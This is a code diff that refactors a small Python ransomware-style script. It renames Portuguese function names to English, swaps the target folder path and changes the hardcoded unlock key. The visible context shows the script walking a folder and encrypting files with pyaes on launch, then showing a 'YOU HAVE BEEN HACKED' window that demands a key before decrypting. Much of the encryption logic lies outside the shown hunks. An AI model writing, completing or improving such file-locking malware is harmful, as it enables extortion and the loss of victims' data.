@@ -6,9 +6,9 @@ import pyaes
 
 print("Working...")
 time.sleep(2)
-path = r"C:/Users/gabriel/Desktop/pasta"
+path = r"C:\Users\test\testing"
 
-def criptografando():
+def encrypting():
 
 
     for root, dirs, files, in os.walk(path):
@@ -29,8 +29,8 @@ def criptografando():
 
 def verify():
     key = ed1.get()
-    if key == "gabrielbanana":
-        descrypt("7c2e0cfd701d9001d2a1c3fe85cea847")
+    if key == "SecretKey":
+        decrypting("7c2e0cfd701d9001d2a1c3fe85cea847")
         for root, dirs, files, in os.walk(path):
             for f in files:
                 criptoPath = os.path.join(root, f)
@@ -45,7 +45,7 @@ def verify():
     else:
         messagebox.showwarning("WRONG ANSWER!", "INCORRECT")
 
-def descrypt(decrypt_file):
+def decrypting(decrypt_file):
 
     for root, dirs, files, in os.walk(path):
         for f in files:
@@ -64,8 +64,8 @@ def descrypt(decrypt_file):
 
 if __name__ == '__main__':
 
-    criptografando()
-    if criptografando:
+    encrypting()
+    if encrypting:
         roots = Tk()
         roots.title("YOU HAVE BEEN HACKED")
         roots.geometry("500x500")
@@ -79,4 +79,3 @@ if __name__ == '__main__':
         ed1.grid(row=3, column=4)
         bt1.grid(row=5, column=4)
         roots.mainloop()
-
